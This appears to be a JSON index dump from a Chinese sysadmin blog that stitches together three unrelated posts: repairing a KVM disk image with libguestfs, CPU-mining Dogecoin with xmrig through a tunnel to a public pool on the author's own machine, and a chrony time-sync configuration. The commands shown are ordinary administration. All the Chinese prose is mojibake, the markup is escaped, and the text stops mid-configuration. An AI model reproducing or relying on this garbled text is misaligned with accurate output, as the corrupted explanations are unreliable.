äº”ã€æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿå¼€å§‹ä¿®å¤ï¼ˆæ–¹æ³•2ï¼‰ æˆ‘ä»¬å¯ä»¥ç”¨ guestmountï¼Œä¹Ÿå¯ä»¥ç›´æ¥ç”¨ guestfish ã€‚\nguestfish æ˜¯ä¸ªå‘½ä»¤è¡Œå·¥å…·ã€‚å®ƒä½¿ç”¨ libguestfs çš„æ‰€æœ‰åŠŸèƒ½ã€‚\nguestfish Welcome to guestfish, the libguestfs filesystem interactive shell for editing virtual machine filesystems. Type: \u0026#39;help\u0026#39; for help on commands \u0026#39;man\u0026#39; to read the manual \u0026#39;quit\u0026#39; to quit the shell \u0026gt;\u0026lt;fs\u0026gt; add vis-16-41-18.qcow2 \u0026gt;\u0026lt;fs\u0026gt; run \u0026gt;\u0026lt;fs\u0026gt; list-filesystems /dev/sda1: ext4 /dev/sda2: ext4 \u0026gt;\u0026lt;fs\u0026gt; mount /dev/sda2 / \u0026gt;\u0026lt;fs\u0026gt; cat /etc/fstab # # /etc/fstab # Created by anaconda on Mon Dec 29 15:24:53 2014 # # Accessible filesystems, by reference, are maintained under \u0026#39;/dev/disk\u0026#39; # See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info # UUID=9fdc111c-3042-4527-b3f8-a2961e55077e / ext4 defaults 1 1 UUID=1855d5e1-18f8-48ea-8c3b-c52cdd512a5e /boot ext4 defaults 1 2 tmpfs /dev/shm tmpfs defaults 0 0 devpts /dev/pts devpts gid=5,mode=620 0 0 sysfs /sys sysfs defaults 0 0 proc /proc proc defaults 0 0 \u0026gt;\u0026lt;fs\u0026gt; guestfishçš„å¸¸ç”¨å‘½ä»¤ï¼š\nadd vis-16-41-18.qcow2 run list-filesystems ll / ls / cat /etc/fstab write-append /etc/rc.d/rc.local \u0026#34;service sshd start\u0026#34; edit /etc/fstab. less /var/log/messages mkdir /tmp/a touch /tmp/a/b.txt write /tmp/a/b.txt rm /tmp/a/b.txt upload Upload a local file to the disk. ###æ³¨æ„ï¼šæ˜¯ä¸Šè½½æœ¬åœ°æ–‡ä»¶åˆ°é•œåƒæ–‡ä»¶å»ï¼ï¼ï¼ å…­ã€virtå¯¹åº”guestfishçš„ä¸€äº›å‘½ä»¤ virt-cat vis-16-41-18.qcow2 /home/supdev/.bash_history virt-copy-in Copy files and directories into a guest. virt-copy-out Copy files and directories out of a guest. virt-edit Edit a file in a guest. virt-ls List files and directories in a guest ä¸ƒã€virt-rescueæ•‘æ´æ¨¡å¼ å¦‚æœè™šæœºç³»ç»Ÿèµ·ä¸æ¥ï¼Œå¯ä»¥å…ˆå°è¯•è¿›å…¥ rescue æ•‘æ´æ¨¡å¼\nvirt-rescue ç±»ä¼¼äºæ•‘æ´ CDï¼Œä½†ç”¨äºè™šæ‹Ÿæœºï¼Œä¸”æ— éœ€æä¾› CDã€‚\nvirt-rescue ä¸ºç”¨æˆ·æä¾›æ•‘æ´å¤–å£³å’Œä¸€äº›ç®€å•çš„æ¢å¤å·¥å…·ï¼Œå¯ç”¨äºæ£€æŸ¥å’Œæ›´æ­£è™šæ‹Ÿæœºæˆ–ç£ç›˜æ˜ åƒä¸­çš„é—®é¢˜ã€‚\nvirt-rescue -a vis-16-41-18.qcow2 Welcome to virt-rescue, the libguestfs rescue shell. Note: The contents of / are the rescue appliance. You need to mount the guest\u0026#39;s partitions under /sysroot before you can examine them. A helper script for that exists: mount-rootfs-and-do-chroot.sh /dev/sda2 \u0026gt;\u0026lt;rescue\u0026gt; [ 67.194384] EXT4-fs (sda1): mounting ext3 file system using the ext4 subsystem [ 67.199292] EXT4-fs (sda1): mounted filesystem with ordered data mode. Opts: (null) mount: /dev/sda1 mounted on /sysroot. mount: /dev bound on /sysroot/dev. mount: /dev/pts bound on /sysroot/dev/pts. mount: /proc bound on /sysroot/proc. mount: /sys bound on /sysroot/sys. Directory: /root Thu Jun 5 13:20:51 UTC 2014 (none):~ # ","permalink":"https://rendoumi.com/posts/20211021-libguestfs/","summary":"\u003cp\u003eåœ¨ç”Ÿäº§ç¯å¢ƒä¸­æˆ‘ä»¬å¤§é‡ä½¿ç”¨äº† kvm çš„è™šæ‹ŸæŠ€æœ¯ï¼Œè™šæ‹Ÿæœºçš„é•œåƒç³»ç»Ÿä½¿ç”¨çš„æ˜¯ Cloud-init çš„æŠ€æœ¯\u003c/p\u003e\n\u003cp\u003eä¸å¯é¿å…çš„ï¼Œè™šæœºä¼šé­åˆ°å„ç§æŸåï¼Œç»´æŠ¤çš„æ‰‹æ®µå°±ååˆ†å¿…è¦äº†\u003c/p\u003e\n\u003cp\u003eå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªè™šæœºæ–‡ä»¶ vis-16-41-18.qcow2 åäº†\u003c/p\u003e\n\u003ch2 id=\"ä¸€å®‰è£…æ”¯æŒåŒ…\"\u003eä¸€ã€å®‰è£…æ”¯æŒåŒ…\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install libguestfs libguestfs-tools\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"äºŒæŸ¥çœ‹æ—¥å¿—\"\u003eäºŒã€æŸ¥çœ‹æ—¥å¿—\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirt-log -a vis-16-41-18.qcow2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"Float Left\" loading=\"lazy\" src=\"/posts/20211021-libguestfs/image-20211021115044742.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæ²¡æœ‰ä»€ä¹ˆç‰¹æ®Šçš„æŠ¥é”™ä¿¡æ¯\u003c/p\u003e\n\u003ch2 id=\"ä¸‰åˆ†ææ–‡ä»¶ç³»ç»Ÿç»„æˆ\"\u003eä¸‰ã€åˆ†ææ–‡ä»¶ç³»ç»Ÿç»„æˆ\u003c/h2\u003e\n\u003cp\u003evirt-filesystemså’Œvirt-dféƒ½å¯ä»¥ï¼Œç”¨virt-dfçœ‹çš„æ›´å¤šä¸€äº›\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirt-filesystems -l -a vis-16-41-18.qcow2 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eName       Type        VFS   Label  Size          Parent\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda1  filesystem  ext4  -      \u003cspan class=\"m\"\u003e209715200\u003c/span\u003e     -\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda2  filesystem  ext4  -      \u003cspan class=\"m\"\u003e214536355840\u003c/span\u003e  -\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirt-df -a vis-16-41-18.qcow2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eFilesystem                           1K-blocks       Used  Available  Use%\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evis-16-41-18.qcow2:/dev/sda1            \u003cspan class=\"m\"\u003e194241\u003c/span\u003e      \u003cspan class=\"m\"\u003e31706\u003c/span\u003e     \u003cspan class=\"m\"\u003e152295\u003c/span\u003e   17%\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evis-16-41-18.qcow2:/dev/sda2         \u003cspan class=\"m\"\u003e206088704\u003c/span\u003e    \u003cspan class=\"m\"\u003e5639856\u003c/span\u003e  \u003cspan class=\"m\"\u003e189973444\u003c/span\u003e    3%\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"å››æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿå¼€å§‹ä¿®å¤æ–¹æ³•1\"\u003eå››ã€æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿå¼€å§‹ä¿®å¤ï¼ˆæ–¹æ³•1ï¼‰\u003c/h2\u003e\n\u003cp\u003eä»ä¸Šé¢å¯ä»¥çœ‹åˆ° vis-16-41-18.qcow2 é‡Œé¢æœ‰ä¸¤ä¸ªåˆ†åŒºï¼Œ/dev/sda1 å’Œ/dev/sda2\u003c/p\u003e\n\u003cp\u003eç¬¬ä¸€ä¸ªåº”è¯¥æ˜¯/bootï¼Œç¬¬äºŒä¸ªæ˜¯/\u003c/p\u003e\n\u003cp\u003eæŠŠ / mount å‡ºæ¥\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir \u003cspan class=\"m\"\u003e18\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eguestmount -a vis-16-41-18.qcow2 -m /dev/sda2 --rw ./18\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæˆ–è€…å…¨è‡ªåŠ¨mount\u003c/p\u003e","title":"Libguestfsçš„æ•‘æ´æ‰‹æ®µ"},{"content":"è¿™æ˜¯ä¸ªå¨±ä¹è¯é¢˜ï¼ŒDogecoin ç‹—å¸åœ¨é©¬æ–¯å…‹çš„å¹æ§é¼“åŠ¨ä¸‹ï¼Œå†²ä¸Šäº‘éœ„\nå…¶å®çœŸçš„ç”¨CPUæŒ–å¸ï¼Œåº”è¯¥æ˜¯æŒ– xmb é—¨ç½—å¸æ‰æ˜¯å¯¹çš„é€‰æ‹©ï¼ŒæŒ–ç‹—å¸åªæ˜¯å¨±ä¹ä¸€ä¸‹\nåºŸè¯ä¸å¤šè¯´ï¼Œç›´æ¥æ”¾ä¸Šæ•™ç¨‹ï¼Œæˆ‘çš„æœºå™¨æ˜¯ CentoOS\né¦–å…ˆéœ€è¦æœ‰ä¸ªç‹—å¸é’±åŒ…åœ°å€ï¼Œè¿™ä¸ªæˆ‘å°±ä¸æ•™å¤§å®¶äº†\nä¸€ã€ä¸‹è½½xmrigæŒ–çŸ¿è½¯ä»¶ ä¸‹è½½åœ°å€ï¼šhttps://github.com/xmrig/xmrig/releases\næˆ‘ä»¬é€‰æ‹©æœ€è¿‘çš„ä¸‹è½½å°±å¥½\näºŒã€åšå¥½åŠ å¯†é€šé“ æˆ‘ä»¬éœ€è¦åšå¥½ä¸€æ¡åŠ å¯†tcpé€šé“\nç”¨ ghostunnel, localhost:9999 \u0026mdash;\u0026gt; vps:9999 \u0026mdash;\u0026gt; rx.unmineable.com:3333\nä¸‰ã€ç”¨screenåå°å¼€æŒ– screen #./xmrig -o localhost:9999 -a rx -k -u DOGE:ç‹—å¸åœ°å€.çŸ¿å·¥å#heyt-3711 ./xmrig -o localhost:9999 -a rx -k -u DOGE:DLR3DZGucJiSdahARW1vV5B1h3WYiw454a.work01 ctrl+a+d å››ã€æŸ¥çœ‹æŒ–äº†å¤šå°‘ æŸ¥çœ‹åœ°å€ï¼šhttps://unmineable.com/coins/DOGE/address/\n","permalink":"https://rendoumi.com/posts/20211021-dogecoin/","summary":"\u003cp\u003eè¿™æ˜¯ä¸ªå¨±ä¹è¯é¢˜ï¼ŒDogecoin ç‹—å¸åœ¨é©¬æ–¯å…‹çš„å¹æ§é¼“åŠ¨ä¸‹ï¼Œå†²ä¸Šäº‘éœ„\u003c/p\u003e\n\u003cp\u003eå…¶å®çœŸçš„ç”¨CPUæŒ–å¸ï¼Œåº”è¯¥æ˜¯æŒ– xmb é—¨ç½—å¸æ‰æ˜¯å¯¹çš„é€‰æ‹©ï¼ŒæŒ–ç‹—å¸åªæ˜¯å¨±ä¹ä¸€ä¸‹\u003c/p\u003e\n\u003cp\u003eåºŸè¯ä¸å¤šè¯´ï¼Œç›´æ¥æ”¾ä¸Šæ•™ç¨‹ï¼Œæˆ‘çš„æœºå™¨æ˜¯ CentoOS\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆéœ€è¦æœ‰ä¸ªç‹—å¸é’±åŒ…åœ°å€ï¼Œè¿™ä¸ªæˆ‘å°±ä¸æ•™å¤§å®¶äº†\u003c/p\u003e\n\u003ch2 id=\"ä¸€ä¸‹è½½xmrigæŒ–çŸ¿è½¯ä»¶\"\u003eä¸€ã€ä¸‹è½½xmrigæŒ–çŸ¿è½¯ä»¶\u003c/h2\u003e\n\u003cp\u003eä¸‹è½½åœ°å€ï¼šhttps://github.com/xmrig/xmrig/releases\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬é€‰æ‹©æœ€è¿‘çš„ä¸‹è½½å°±å¥½\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"Float Left\" loading=\"lazy\" src=\"/posts/20211021-dogecoin/image-20211021101957637.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"äºŒåšå¥½åŠ å¯†é€šé“\"\u003eäºŒã€åšå¥½åŠ å¯†é€šé“\u003c/h2\u003e\n\u003cp\u003eæˆ‘ä»¬éœ€è¦åšå¥½ä¸€æ¡åŠ å¯†tcpé€šé“\u003c/p\u003e\n\u003cp\u003eç”¨ ghostunnel,    localhost:9999 \u0026mdash;\u0026gt; vps:9999 \u0026mdash;\u0026gt; rx.unmineable.com:3333\u003c/p\u003e\n\u003ch2 id=\"ä¸‰ç”¨screenåå°å¼€æŒ–\"\u003eä¸‰ã€ç”¨screenåå°å¼€æŒ–\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003escreen\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#./xmrig -o localhost:9999 -a rx -k -u DOGE:ç‹—å¸åœ°å€.çŸ¿å·¥å#heyt-3711\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./xmrig -o localhost:9999 -a rx -k -u DOGE:DLR3DZGucJiSdahARW1vV5B1h3WYiw454a.work01\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ectrl+a+d\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20211021102338089\" loading=\"lazy\" src=\"/posts/20211021-dogecoin/image-20211021102338089.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"å››æŸ¥çœ‹æŒ–äº†å¤šå°‘\"\u003eå››ã€æŸ¥çœ‹æŒ–äº†å¤šå°‘\u003c/h2\u003e\n\u003cp\u003eæŸ¥çœ‹åœ°å€ï¼šhttps://unmineable.com/coins/DOGE/address/\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211021102710484\" loading=\"lazy\" src=\"/posts/20211021-dogecoin/image-20211021102710484.png\"\u003e\u003c/p\u003e","title":"å¦‚ä½•ç”¨CPUæŒ–ç‹—å¸Dogecoin"},{"content":"chrony å·²ç»æˆäº†äº‹å®æ ‡å‡†ï¼Œæ›¿ä»£äº†ntpã€‚\nä½†æ˜¯ï¼Œæœ‰å‡ ä¸ªç»†èŠ‚ï¼Œéœ€è¦éå¸¸æ³¨æ„ã€‚\nç»™å‡ºæˆ‘ä»¬çš„é…ç½®ï¼Œ/etc/chrony.conf\n# Use public servers from the pool.ntp.org project. # Please consider joining the pool (http://www.pool.ntp.org/join.html). server 172.10.1.1 iburst prefer minpoll 6 maxpoll 10 server 172.10.1.2 iburst # Record the rate at which the system clock gains/losses time. driftfile /var/lib/chrony/drift # Allow the system clock to be stepped in the first three updates # if its offset is larger than 1 second. makestep 1.0 3 # Enable kernel synchronization of the real-time clock (RTC). rtcsync # Enable hardware timestamping on all interfaces that support it. #hwtimestamp * # Increase the minimum number of selectable sources required to adjust # the system clock. #minsources 2 # Allow NTP client access from local network. #allow 192.168.0.0/16 # Serve time even if not synchronized to a time source. #local stratum 10 # Specify file containing keys for NTP authentication. #keyfile /etc/chrony.keys # Specify directory for log files. logdir /var/log/chrony logchange 0.5 # Select which information is logged. #log measurements statistics tracking rtc é‡Œé¢æœ‰å¥½å‡ ä¸ªç»†èŠ‚ï¼Œä¸‹é¢é€ä¸€è§£é‡Šä¸€ä¸‹ï¼š\nä¸€ã€server è¿™é‡Œå¯ä»¥æ·»åŠ å¾ˆå¤šæ—¶é—´æœåŠ¡å™¨ï¼Œ172.10.1.1 å’Œ 172.10.1.2 æ˜¯ä¸¤å°è‡ªå»ºçš„æ—¶é—´æœåŠ¡å™¨ã€‚\nibust ä¼šåœ¨ chrony å¯åŠ¨çš„2ç§’å†…ï¼Œå»å¿«é€ŸpollæœåŠ¡å™¨4æ¬¡æ¥å¿«é€ŸçŸ«æ­£å½“å‰ç³»ç»Ÿæ—¶é—´\nprefer ä¼˜å…ˆä½¿ç”¨æŒ‡å®šçš„æœåŠ¡å™¨\nminpoll 6ï¼Œç¼ºçœæ˜¯6ï¼Œæ„æ€æ˜¯2çš„6æ¬¡æ–¹ï¼Œä¹Ÿå°±æ˜¯64ç§’ï¼Œæœ€å°è½®è¯¢æ—¶é—´æœåŠ¡å™¨çš„æ—¶é—´é—´éš”æ˜¯64ç§’\nmaxpoll 10ï¼Œç¼ºçœæ˜¯10ï¼ŒåŒä¸Šï¼Œ2çš„10æ¬¡æ–¹ï¼Œä¹Ÿå°±æ˜¯1024ç§’ï¼Œæœ€å¤§è½®è¯¢æ—¶é—´é—´éš”æ˜¯1024ç§’\né€šå¸¸æƒ…å†µä¸‹ä¸€è¿‡minpollçš„æ—¶é—´å‘¨æœŸï¼Œå°±ä¼šè§¦å‘ä¸€æ¬¡æ—¶é—´åŒæ­¥è¯¢é—®ã€‚\näºŒã€makestep æ­£å¸¸æƒ…å†µä¸‹å¦‚æœç³»ç»Ÿæ—¶é’Ÿè·Ÿæ—¶é—´æœåŠ¡å™¨ä¸ä¸€è‡´ï¼Œchronyè°ƒæ•´çš„æ–¹å¼æ˜¯æ…¢æ…¢å¢åŠ ï¼Œæˆ–æ…¢æ…¢å‡å°‘ï¼Œä¸ä¼šä¸€æ­¥åˆ°ä½ï¼Œç›´æ¥å»è·Ÿæ—¶é—´æœåŠ¡å™¨å¯¹é½ã€‚\nmakestep 1.0 3ï¼Œæ„æ€å°±æ˜¯å¦‚æœæ—¶é—´æœåŠ¡å™¨è·Ÿç³»ç»Ÿæ—¶é—´ç›¸å·®1ç§’ï¼Œé‚£ä¹ˆå°±åœ¨ä¸‹3ä¸ªæ—¶é’Ÿæ›´æ–°ä¸­è¿½ä¸Šæ—¶é—´æœåŠ¡å™¨ã€‚\nè¿™æ ·å°±ä¼šç«‹åˆ»å¿«é€Ÿè¿½å¹³äº†ï¼Œè¿™æ ·ä¼šå¸¦æ¥æ—¶é—´è·³è·ƒã€‚\nä¸‰ã€rtcsync è¿™ä¸ªæ˜¯æŠŠç³»ç»Ÿæ—¶é’ŸåŒæ­¥åˆ°ä¸»æ¿çš„ç¡¬ä»¶æ—¶é’Ÿå»ã€‚\nç¼ºçœæƒ…å†µä¸‹æ˜¯11åˆ†é’ŸåŒæ­¥ä¸€æ¬¡\nå››ã€logchange logchange 0.5ï¼Œæ„æ€æ˜¯å¦‚æœchronyè°ƒæ•´çš„ç³»ç»Ÿæ—¶é—´ï¼Œè¶…è¿‡äº†0.5ç§’çš„æ—¶é•¿ï¼Œå°±ä¼šå‘ä¸€æ¡æ¶ˆæ¯åˆ°syslogï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½åœ¨/var/log/messagesé‡Œçœ‹åˆ°è¿™æ¡æ¶ˆæ¯äº†ã€‚\näº”ã€éªŒè¯è°ƒè¯• å¼€å‘äººå‘˜ä¼šé—®ï¼Œä»€ä¹ˆæ—¶å€™åŒæ­¥çš„æœåŠ¡å™¨å•Šï¼Œå¤šé•¿æ—¶é—´åŒæ­¥ä¸€æ¬¡ï¼Œæ—¶é—´åˆ°åº•å‡†ä¸å‡†å•Šï¼Œæœ‰æ²¡æœ‰å‘ç”Ÿè·³è·ƒå•Š\næˆ‘ä»¬å°±ç”¨chronyc sourcesæ¥éªŒè¯ï¼Œé…ç½®ä¸­\nserver 172.10.1.1 iburst prefer minpoll 4 maxpoll 5 server 172.10.1.2 iburst è§£é‡Šä¸€ä¸‹ï¼Œminpoll 4 maxpoll 5 ï¼Œé‚£ä¹ˆæœ€å°è½®è¯¢æ—¶é—´16ç§’ï¼Œæœ€å¤§32ç§’ã€‚\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸Šå›¾ LastRx å°±æ˜¯ä¸Šæ¬¡è¯¢é—®æ—¶é—´æœåŠ¡å™¨çš„é—´éš”æ—¶é—´ï¼Œ14ç§’ã€15ç§’ã€16ç§’ï¼Œç„¶åå°±å˜1äº†ï¼Œæœ€å°é—´éš”16ç§’åï¼Œç«‹å³å°±è¯¢é—®æ—¶é—´æœåŠ¡å™¨ï¼ŒåŒæ­¥æ—¶é—´ã€‚\nåŒæ ·å¯ä»¥çœ‹åˆ°ç¬¬äºŒå°æ—¶é—´æœåŠ¡å™¨å°±ä¸å—è¿™ä¸ªé™åˆ¶ï¼Œç¼ºçœminpoll 6ï¼Œå°±æ˜¯64ç§’ã€‚æ‰€ä»¥ä¸Šå›¾ç¬¬äºŒå°ï¼Œ63ç§’ã€64ç§’ã€65ç§’ï¼Œå˜0ï¼Œæ‰å»è¯¢é—®æ—¶é—´æœåŠ¡å™¨ã€‚\næ€»ç»“ä¸€ä¸‹ï¼Œchrony è°ƒæ•´æ—¶é—´åå·®æ˜¯åŒ€é€Ÿçš„ï¼Œç¼“æ…¢çš„ã€‚å®ƒè¯¢é—®æ—¶é—´æœåŠ¡å™¨çš„é—´éš”ç”±minpollæ¥æ§åˆ¶ã€‚\næˆ‘ä»¬ç”¨logchangeæ¥è®°å½•å¤§çš„æ—¶é—´è°ƒæ•´ï¼Œä»¥å¤‡è¿½æº¯å’ŒæŸ¥è¯¢ã€‚\n","permalink":"https://rendoumi.com/posts/20211020-chrony/","summary":"\u003cp\u003echrony å·²ç»æˆäº†äº‹å®æ ‡å‡†ï¼Œæ›¿ä»£äº†ntpã€‚\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯ï¼Œæœ‰å‡ ä¸ªç»†èŠ‚ï¼Œéœ€è¦éå¸¸æ³¨æ„ã€‚\u003c/p\u003e\n\u003cp\u003eç»™å‡ºæˆ‘ä»¬çš„é…ç½®ï¼Œ/etc/chrony.conf\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Use public servers from the pool.ntp.org project.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Please consider joining the pool (http://www.pool.ntp.org/join.html).\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eserver 172.10.1.1 iburst prefer minpoll 6 maxpoll 10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eserver 172.10.1.2 iburst\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Record the rate at which the system clock gains/losses time.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edriftfile /var/lib/chrony/drift\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Allow the system clock to be stepped in the first three updates\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# if its offset is larger than 1 second.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003emakestep 1.0 3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Enable kernel synchronization of the real-time clock (RTC).\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ertcsync\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Enable hardware timestamping on all interfaces that support it.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#hwtimestamp *\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Increase the minimum number of selectable sources required to adjust\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# the system clock.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#minsources 2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Allow NTP client access from local network.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#allow 192.168.0.0/16\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Serve time even if not synchronized to a time source.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#local stratum 10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Specify file containing keys for NTP authentication.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#keyfile /etc/chrony.keys\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Specify directory for log 